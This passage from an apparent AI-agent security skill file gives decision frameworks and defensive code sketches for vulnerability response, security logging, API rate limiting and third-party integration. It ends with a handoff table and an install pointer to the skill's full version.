1. Triage (< 1 hour)
   - Assess severity
   - Assign owner
   - Notify stakeholders

2. Investigate (< 4 hours for critical)
   - Confirm vulnerability
   - Assess impact
   - Identify affected systems

3. Mitigate (immediate for critical)
   - Temporary fix if possible
   - Reduce exposure
   - Monitor for exploitation

4. Fix (per timeline)
   - Develop patch
   - Test thoroughly
   - Deploy with monitoring

5. Verify (after fix)
   - Confirm remediation
   - Regression testing
   - Update documentation

EXCEPTION PROCESS:
If can't meet timeline:
- Document reason
- Implement mitigations
- Get approval
- Set new deadline

METRICS:
- Mean time to remediate
- Aging vulnerabilities
- Recurrence rate
```

**Default Recommendation:** Critical < 24h, High < 7d, Medium < 30d, Low < 90d. Track and report metrics.

---

## Decision 8: Logging and Monitoring Scope

**Context:** What to log for security purposes.

**Options:**

| Level | Coverage | Storage | Analysis |
|-------|----------|---------|----------|
| **Minimal** | Auth only | Short | Manual |
| **Standard** | Auth + access | Medium | Basic alerts |
| **Comprehensive** | All security | Long | SIEM |
| **Full** | Everything | Very long | Advanced |

**Framework:**
```
Security logging strategy:

ALWAYS LOG:
- Authentication attempts (success/fail)
- Authorization decisions
- Admin actions
- Configuration changes
- Security events

STANDARD LOGGING:
- Resource access
- API calls
- Data exports
- User actions (sensitive)

COMPREHENSIVE:
- All API requests
- Database queries (summarized)
- File access
- Network connections

LOG FORMAT:
{
  "timestamp": "2024-01-15T10:30:00Z",
  "level": "SECURITY",
  "event": "login_attempt",
  "userId": "user-123",
  "ip": "1.2.3.4",
  "userAgent": "Mozilla/5.0...",
  "success": false,
  "reason": "invalid_password",
  "requestId": "req-abc"
}

RETENTION:
Security logs: 1 year minimum
Auth logs: 1 year
Access logs: 90 days
Debug logs: 30 days

ALERTING:
Critical:
- Multiple failed logins
- Admin privilege changes
- Security control bypass
- Unusual data access

High:
- Configuration changes
- New admin accounts
- Bulk data access

MONITORING STACK:
Collection: Fluentd, Vector
Storage: Elasticsearch, Loki
Analysis: Kibana, Grafana
Alerting: PagerDuty, Opsgenie

COMPLIANCE:
PCI-DSS: 1 year retention
HIPAA: 6 years
SOC 2: 1 year
GDPR: Justify retention
```

**Default Recommendation:** Standard logging with 1-year retention. Alert on auth anomalies and admin actions.

---

## Decision 9: API Rate Limiting Strategy

**Context:** Protecting APIs from abuse.

**Options:**

| Strategy | Granularity | Complexity | Protection |
|----------|-------------|------------|------------|
| **Global** | All requests | Low | Basic |
| **Per-IP** | By IP address | Low | Moderate |
| **Per-user** | By account | Medium | Good |
| **Per-endpoint** | By route | Medium | Targeted |

**Framework:**
```
Rate limiting strategy:

GLOBAL LIMITS:
Purpose: Prevent overall overload
Implementation:
app.use(rateLimit({
  windowMs: 60 * 1000,  // 1 minute
  max: 1000             // 1000 total requests
}))

PER-IP LIMITS:
Purpose: Prevent individual abuse
Implementation:
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 100,              // 100 per IP
  keyGenerator: (req) => req.ip
}))

PER-USER LIMITS:
Purpose: Fair usage enforcement
Implementation:
app.use(rateLimit({
  windowMs: 60 * 1000,
  max: 1000,
  keyGenerator: (req) => req.user?.id || req.ip
}))

PER-ENDPOINT LIMITS:
Purpose: Protect sensitive operations
Implementation:
// Auth endpoints: Strict
app.use('/auth/*', rateLimit({
  windowMs: 60 * 1000,
  max: 5
}))

// API endpoints: Moderate
app.use('/api/*', rateLimit({
  windowMs: 60 * 1000,
  max: 100
}))

RATE LIMIT VALUES:
Login: 5 per minute
Signup: 3 per minute
Password reset: 3 per hour
API (authenticated): 100 per minute
API (unauthenticated): 20 per minute
Uploads: 10 per hour

RESPONSE:
429 Too Many Requests
{
  "error": "Rate limit exceeded",
  "retryAfter": 60
}

Headers:
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1705320000

BYPASS CONSIDERATIONS:
- Internal services
- Monitoring/health checks
- Trusted partners
- Premium tiers
```

**Default Recommendation:** Per-IP baseline, per-user for authenticated, strict per-endpoint for sensitive operations.

---

## Decision 10: Third-Party Integration Security

**Context:** Securely integrating with external services.

**Options:**

| Approach | Trust Level | Isolation | Risk |
|----------|-------------|-----------|------|
| **Direct** | Full trust | None | High |
| **Validated** | Verify responses | Moderate | Medium |
| **Sandboxed** | Isolated | High | Low |
| **Proxied** | Through gateway | Very high | Very low |

**Framework:**
```
Third-party security:

EVALUATION CRITERIA:
Before integrating:
1. Security posture (SOC 2, certifications)
2. Data handling (what do they access?)
3. API security (auth, encryption)
4. Breach history
5. Vendor stability

CREDENTIAL SECURITY:
- Store in secrets manager
- Use least privilege
- Rotate regularly
- Monitor usage

Request security:
const response = await fetch(thirdPartyUrl, {
  headers: {
    'Authorization': `Bearer ${await getSecret('api-key')}`
  },
  timeout: 5000  // Don't hang forever
})

RESPONSE VALIDATION:
// Never trust third-party data
const schema = z.object({
  userId: z.string(),
  status: z.enum(['active', 'inactive'])
})

const validated = schema.safeParse(response.data)
if (!validated.success) {
  logger.error('Invalid third-party response')
  throw new Error('Invalid response')
}

WEBHOOK SECURITY:
// Verify signatures
function verifyWebhook(req) {
  const signature = req.headers['x-webhook-signature']
  const expected = hmac(req.body, webhookSecret)
  return crypto.timingSafeEqual(signature, expected)
}

SANDBOXING:
// Isolate third-party JavaScript
<iframe
  sandbox="allow-scripts"
  src="https://third-party.com/widget"
/>

// CSP for third-party resources
Content-Security-Policy:
  script-src 'self' https://trusted-cdn.com;

MONITORING:
- Track API calls to third parties
- Alert on failures
- Monitor for unusual patterns
- Log sensitive operations

FALLBACK PLANNING:
What if third party is down?
- Graceful degradation
- Cached responses
- Alternative providers
```

**Default Recommendation:** Validate all responses, use secrets manager for credentials, verify webhooks, monitor usage, plan for failures.

## Collaboration

### When to Hand Off

| Trigger | Delegate To | Context |
|---------|-------------|--------|
| `infrastructure|kubernetes|terraform` | devops | Security needs infrastructure changes |
| `code fix|implementation` | backend | Security vulnerability needs code fix |
| `test|validation|verification` | qa-engineering | Security fix needs testing |

### Receives Work From

- **backend**: Backend needs security review
- **frontend**: Frontend needs security guidance
- **devops**: Infrastructure needs security review
- **code-review**: Security-sensitive code needs review

### Works Well With

- backend
- frontend
- devops
- code-review
- qa-engineering

---

## Get the Full Version

This skill has **automated validations**, **detection patterns**, and **structured handoff triggers** that work with the Spawner orchestrator.

```bash
npx vibeship-spawner-skills install
```

Full skill path: `~/.spawner/skills/development/cybersecurity/`

**Includes:**
- `skill.yaml` - Structured skill definition
- `sharp-edges.yaml` - Machine-parseable gotchas with detection patterns
- `validations.yaml` - Automated code checks
- `collaboration.yaml` - Handoff triggers for skill orchestration

**Deep content:**
- `patterns.md` - Comprehensive pattern library
- `anti-patterns.md` - What to avoid and why
- `sharp-edges.md` - Detailed gotcha documentation
- `decisions.md` - Decision frameworks

---

*Generated by [VibeShip Spawner](https://github.com/vibeforge1111/vibeship-spawner-skills)*
